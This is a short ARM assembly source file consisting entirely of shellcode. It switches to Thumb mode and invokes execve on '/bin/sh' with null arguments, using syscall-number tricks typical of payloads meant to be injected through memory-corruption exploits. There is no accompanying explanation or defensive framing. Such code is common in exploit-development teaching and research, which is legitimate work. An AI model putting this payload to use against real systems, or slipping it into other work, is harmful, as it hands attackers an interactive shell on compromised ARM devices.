/**

*/

    .global _start
    .text

_start:
    // switch to thumb mode
    .code 32
    add    r3, pc, #1
    bx     r3
    
    .code 16
    // execve("/bin/sh", NULL, NULL);
    adr    r0, sh         // r0 = "/bin/sh"
    eor    r1, r1, r1     // r1 = NULL
    eor    r2, r2, r2     // r2 = NULL
    mov    r7, #11        // r7 = execve
    svc    1
    nop
sh:    
.ascii "/bin/sh"
